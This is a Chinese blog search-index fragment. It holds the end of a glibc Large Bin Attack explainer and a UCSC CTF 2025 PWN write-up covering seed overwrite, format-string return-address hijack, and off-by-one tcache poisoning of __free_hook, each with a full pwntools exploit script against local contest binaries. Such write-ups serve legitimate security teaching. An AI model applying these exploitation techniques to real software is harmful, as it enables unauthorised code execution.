之后的（看图一想象插入 P3 ）</p><p>代码将 P3 的 bk 变成了进入large bin时相同大小的后面一个堆块也就是 stack_var1 - 0x10 （这里虽然之前 P2 纂改了大小，但是它的判定还是在 0x510这个范围，所以可以看作是和 P3 在同一个 Bin 里面）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd = fwd;</span><br></pre></td></tr></table></figure><p>P3 的 fd 变成了 P3 的前面一个堆块也就是 P2 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk = victim;</span><br></pre></td></tr></table></figure><p>将 P2 的 bk 变成了 P3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>将 stack_var1 - 0x10 的 fd 也就是 stack_var1 变成了 P3 !</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426233127191.png" alt="image-20250426233127191"></p><p><strong><u>Large Bin Attack 成功实现！</u></strong></p><p>成功纂改了任意地址的值为堆块的地址。</p><p>后续还会更新关于 Largin Bin Attack 相关题型的讲解，在这篇文章 。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 知识归纳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UCSC CTF 2025 WP</title>
      <link href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/"/>
      <url>/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="UCSC-CTF-2025-WP-—-PWN"><a href="#UCSC-CTF-2025-WP-—-PWN" class="headerlink" title="UCSC CTF 2025 WP —- PWN"></a>UCSC CTF 2025 WP —- PWN</h2><h3 id="BoFido"><a href="#BoFido" class="headerlink" title="BoFido"></a>BoFido</h3><p><img src="/../WP/UCSC2025/1.png" alt="1"></p><p>常规检查： 64位程序 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/2.png" alt="2"></p><p>主函数的代码逻辑非常的简单 循环十次 每次循环创造三个随机数 让玩家进行猜数游戏</p><p>程序中还存在明显的system(“&#x2F;bin&#x2F;sh”)后门函数调用 </p><p>要想进入这个后门函数 我们就必须要满足 v14 &#x3D;&#x3D; 10 这一个条件</p><p>而 v14 这个变量在程序中的作用是统计全猜中的次数 每个回合三个数字全部猜中 v14 的值就会加一 但由于进行猜数的回合只有十次 所以我们若想要进行后门函数调用 最直接的方法就必须要每一个回合都把三个数给猜对 </p><p>但是如果是一直乱猜 明显是不太现实（比彩票中大奖的概率还低）<strong>所以这就需要我们来控制赌局的中奖率</strong> 从而达到把把全猜中的目的</p><p><strong><u>那么我们该如何利用漏洞进行实现呢？</u></strong></p><p><img src="/../WP/UCSC2025/3.png" alt="image-20250422234155656"></p><p>我们想要控制中奖率 就必须要知道 随机数是如何进行生成的：</p><hr><ul><li>C 语言提供了 <code>rand()</code> 函数来生成随机数，该函数通常基于线性同余法等算法实现。每次调用 <code>rand()</code> 函数时，它会根据内部的种子和算法生成下一个随机数。</li></ul><hr><p>但是如果程序每次都利用相同的种子，那么生成的随机数序列也会相同，这样就无法得到真正的随机数，所以通常我们都会以当前时间作为种子，因为时间是无时无刻发生变化的，这样生成的数值才会满足随机性。</p><p><strong>seed &#x3D; time(0LL)</strong></p><p>这行代码的作用是初始化时间的种子 这样我们得到的随机数就是完全随机的了</p><p>这样就不方便我们进行对赌局的把控 </p><p>转念一想，如果生成随机数是根据内部的种子和固定的算法决定的，这个种子因为程序进行了时间初始化，导致种子在不断变化，但如果我们在其生成时间的种子之后，对seed进行一个覆盖，把它覆盖为一个固定大小的值，<strong><u>这样我们生成的随机数序列就会变得有迹可循</u></strong></p><p><u>如果你能够预知未来，这样的赌局还会存在失误吗…..</u></p><h5 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h5><p>由于程序给我们提供了一个0x25字节的输入点 恰好这个输入点存在一个漏洞 让我们进行一个利用</p><p><img src="/../WP/UCSC2025/4.png" alt="image-20250422235747015"></p><p>可以看到输入点 buf 和随机数种子 seed 都存在于栈上，并且相距0x20字节（恰好在0x25输入范围以内）只要我们填充数据0x21个字节把seed覆盖成一个固定的值 这样随机数序列也会固定</p><p><img src="/../WP/UCSC2025/5.png" alt="image-20250423000924364"></p><p>我选择直接填充0x21个的a字节，第一次运行程序记下十个回合的幸运数字，第二次运行程序直接按第一个回合的顺序打就可以直接打通</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="userlogin"><a href="#userlogin" class="headerlink" title="userlogin"></a>userlogin</h3><p><img src="/../WP/UCSC2025/6.png" alt="image-20250423124813045"></p><p>常规检查：64位 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/7.png" alt="image-20250423124845602"></p><p>main（）函数和 generatePassword（）函数没有什么不对劲的地方 我们直接看login（）函数</p><p>login（）函数：</p><p><img src="/../WP/UCSC2025/8.png" alt="image-20250423125310204"></p><p>存在一个输入点，输入大小是32字节，随后strcmp函数对输入的字符串进行对照</p><ol><li><p>supersecureuser</p><p>如果输入的字符串为“supersecureuser”，则进入user（）函数</p></li><li><p>随机字符串</p><p>如果输入的字符串为 a1 ，则进入root（）函数，但是由于 a1 涉及到随机数，所以 a1 具有不确定性，很难对其进行预测</p><h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>user（）函数：</p></li></ol><p><img src="/../WP/UCSC2025/9.png" alt="image-20250423131703908"></p><p>user（）函数内部有一个明显的格式化字符串漏洞 并且由于 main（）函数内for循环的关系，我们可以连续进入三次 login（）函数，从而我们就拥有三次格式化字符串漏洞利用的机会</p><p>同时程序存在shell（）后门函数：</p><p><img src="/../WP/UCSC2025/10.png" alt="image-20250423132447202"></p><h5 id="做题思路：-1"><a href="#做题思路：-1" class="headerlink" title="做题思路："></a>做题思路：</h5><p>1.利用格式化字符串漏洞泄露出返回地址</p><p>2.将返回地址写入栈上 并改返回地址的内容为后门函数的地址</p><p><img src="/../WP/UCSC2025/11.png" alt="image-20250423135436505"></p><p>挑选了一个栈上的一个地址，打算对这个地址进行一个泄露，随后计算出它与返回地址的固定偏移，利用泄露出来的地址加上固定偏移，得到的结果就是返回地址了</p><p><img src="/../WP/UCSC2025/12.png" alt="image-20250423135740277"></p><p>fmtarg 可以计算出泄露地址的偏移是 %7 </p><p>第一段payload就可以构造出来了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;%7$p&#x27;</span><br></pre></td></tr></table></figure><p>这段payload可以直接把内容作为指针泄露出来 计算出固定偏移为 0x38，这样我们就得到了返回地址</p><p>第二次格式化字符串漏洞，我们先把返回地址写入栈上，紧接着对它进行修改，将其指向shell（）后门函数</p><p><img src="/../WP/UCSC2025/13.png" alt="image-20250423185521207"></p><p>可以看到，最初的返回地址指向的是0x4154b这个地址</p><p><img src="/../WP/UCSC2025/14.png" alt="image-20250423185607974"></p><p>我们需要将它改写为0x401265这个地址，也就是需要改写两个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br></pre></td></tr></table></figure><p><img src="/../WP/UCSC2025/15.png" alt="image-20250423190714979"></p><p>可以看到返回地址已经被成功改写</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;retn  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(retn))                  </span><br><span class="line">fmt()</span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>解法二相对于解法一来说 确实较为简单 </p><p><img src="/../WP/UCSC2025/16.png" alt="image-20250423195504888"></p><p>已知user（）函数中存在格式化字符串漏洞，经过测试发现root用户的密码正是上图红框的位置，</p><p>只要通过字格泄露出root的密码，这样我们就可以进入root（）函数</p><p>root（）函数：</p><p><img src="/../WP/UCSC2025/17.png" alt="image-20250423195504889"></p><p>root（）函数具有明显的栈溢出漏洞，由于我们已经知道了shell的地址，所以这题可以通过root（）函数，栈溢出直接劫持返回地址指向shell函数</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$s&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">password = p.recvuntil(<span class="string">&quot;Password:&quot;</span>)[:-<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password  &gt;&gt; &quot;</span> + <span class="built_in">str</span>(password))</span><br><span class="line">p.sendline(password)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Note: \n&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="疯狂复制"><a href="#疯狂复制" class="headerlink" title="疯狂复制"></a>疯狂复制</h3><p><strong>LIBC：2.27-3ubuntu1_amd64</strong></p><p>（本题目解法比较多，后续会看情况更新更多的解法）</p><p><img src="/../WP/UCSC2025/18.png" alt="image-20250424114730714"></p><p>常规检查：64位 RELRO NX PIE</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/19.png" alt="image-20250424115140346"></p><p>  <u>****<strong>很经典的菜单堆题，增删查改四样俱全</strong></u></p><p>del（）函数：</p><p><img src="/../WP/UCSC2025/20.png" alt="image-20250424115351043"></p><p>free后将指针置空，故不存在UAF或者double free漏洞</p><p>edit（）函数：</p><p><img src="/../WP/UCSC2025/21.png" alt="image-20250424115540363"></p><p>setinput（）函数：</p><p><img src="/../WP/UCSC2025/22.png" alt="image-20250424115631440"></p><p>查看edit（）函数 ，初步怀疑存在off by one漏洞</p><p><img src="/../WP/UCSC2025/23.png" alt="image-20250424115906819"></p><p>本地交互证明猜想正确，size大小为8个字节，我们却可以编辑输入9个字节的数据，利用这多出来的一个字节，我们可以做很多事情</p><h4 id="解法一-（off-by-one）："><a href="#解法一-（off-by-one）：" class="headerlink" title="解法一 （off by one）："></a>解法一 （off by one）：</h4><h5 id="做题思路：-2"><a href="#做题思路：-2" class="headerlink" title="做题思路："></a>做题思路：</h5><ol><li>先利用 unsortedbin leak 泄露出 libc基地址</li><li>再通过 off by one 直接修改__free_hook为system的地址</li><li>最后释放一个内容为 &#x2F;bin&#x2F;sh\x00 的堆块 从而getshell</li></ol><p><strong>Part1: 泄露LIBC</strong></p><hr><p>由于题目libc版本是2.27-3ubuntu1_amd64，glibc在2.26版本引入了一个新的堆内存管理机制—-TcacheBin，旨在加速小块内存的分配和释放。</p><h5 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h5><ol><li><p>TcacheBin管理的内存块大小范围为 0x18 - 0x408</p></li><li><p>每个相同大小的TcacheBin最多存储 7 个chunk</p></li><li><p>如果相同大小的TcacheBin没有占满7个chunk，free掉对应大小的堆块后会优先进入TcacheBin 而不是 fastbin 或者是 unsortedbin</p><hr><p>由于TcacheBin的引入，我们无法直接使用unsortedbin leak，因为释放的堆块会优先进入tcachebin，但是由于tcachebin存储的chunk数量有限制，只要我们把7个位置全部占满，这样我们就可以释放对应大小的堆块，从而进入unsortedbin。</p><p><img src="/../WP/UCSC2025/24.png" alt="image-20250424132206434"></p><p>先创造9个0x90的堆块，我们需要先释放前七个堆块，占满tcachebin，然后释放第8个堆块，使其进入unsortedbin，第九个堆块的作用是隔绝topchunk，防止free掉的unsortedbin与topchunk进行合并。</p><p><img src="/../WP/UCSC2025/25.png" alt="image-20250424132650387"></p></li></ol><p>可以看到chunk8已经进入了unsortedbin当中，紧接着我们需要增添一个chunk_size为0x40大小的堆块10（其实chunk_size在0x90以内都可以），这个堆块是由unsortedbin分配的，之所以要增添一个0x40大小的chunk10，而不是增添一个0x90大小的chunk10，是因为TcacheBin如果大小匹配，会优先从TcacheBin中分配堆块，这样一来我们就无法利用unsortedbin leak了（不了解unsortedbin leak的，可以先去查阅相关资料）</p><p><img src="/../WP/UCSC2025/26.png" alt="image-20250424134108511"></p><p>利用show（）函数，我们就可以得到chunk10中的内容，计算与libc基地址的偏移，然后用泄露出来的指针减去偏移，我们就得到了libc基地址</p><p>不过在进行下一步之前，记得先把unsortedbin中剩下的0x50大小的chunk申请回来，以免造成干扰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -  <span class="number">0x3ebd20</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p><strong>Part2 : off by one 修改__free_hook</strong> </p><p>虽然tcachebin不是之前熟悉的 fastbin，但是我们同样可以利用 off by one 漏洞 —— 新的堆内存管理机制虽然提高了性能，但也减低了安全性，tcache的检查机制相对与fastbin甚至还有所减少</p><p><img src="/../WP/UCSC2025/27.png" alt="image-20250424134539382"></p><p>先创造三个0x40大小的chunk，分别是 chunk11、chunk12 以及 chunk13</p><p><img src="/../WP/UCSC2025/29.png" alt="image-20250424134700582"></p><p>查看chunk11的内存分布，我们的目的是利用多溢出的一个字节修改chunk12堆块的大小为0x71，然后free掉chunk12，造成chunk12与chunk13的堆块重叠，这样我们就可以修改利用chunk12来修改chunk13的内容，其作用等同于UAF漏洞</p><p><img src="/../WP/UCSC2025/28.png" alt="image-20250424140455138"></p><p>可以看到原本chunk13的位置，chunk13的fd指针已经被我们改写成了free_hook的地址，指向了free_hook,所以只要在申请两个堆块，分别是chunk14和chunk15，我们就可以把free_hook申请出来（chunk15对应的是free_hook),我们把chunk14的内容修改成&#x2F;bin&#x2F;sh\x00，把chunk15的内容修改成system_addr,这样我们只要执行free(14),就相当于执行了system(‘&#x2F;bin&#x2F;sh\x00’)</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">def add(index,size):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Size &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">#--------------------------------------------------------------------------#</span><br><span class="line">#part1</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x80)</span><br><span class="line">for i in range(8):</span><br><span class="line">    free(i)</span><br><span class="line">free(7)</span><br><span class="line">add(9,0x30)</span><br><span class="line">show(9)</span><br><span class="line">p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) -  0x3ebd20</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">print(&quot;libc_base  &gt;&gt; &quot; + hex(libc_base))</span><br><span class="line">add(10,0x40)</span><br><span class="line">#part2</span><br><span class="line">add(11,0x38)</span><br><span class="line">add(12,0x38)</span><br><span class="line">add(13,0x38)</span><br><span class="line">payload = b&#x27;a&#x27;*0x38 + p8(0x71)</span><br><span class="line">edit(11,payload)</span><br><span class="line">free(12)</span><br><span class="line">free(13)</span><br><span class="line">add(12,0x68)</span><br><span class="line">payload2 = b&#x27;a&#x27;*0x38 + p64(0x41) + p64(free_hook)</span><br><span class="line">edit(12,payload2)</span><br><span class="line">add(14,0x38)</span><br><span class="line">add(15,0x38)</span><br><span class="line">edit(14,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">edit(15,p64(system_addr))</span><br><span class="line">free(14)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UCSC CTF 2025 WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
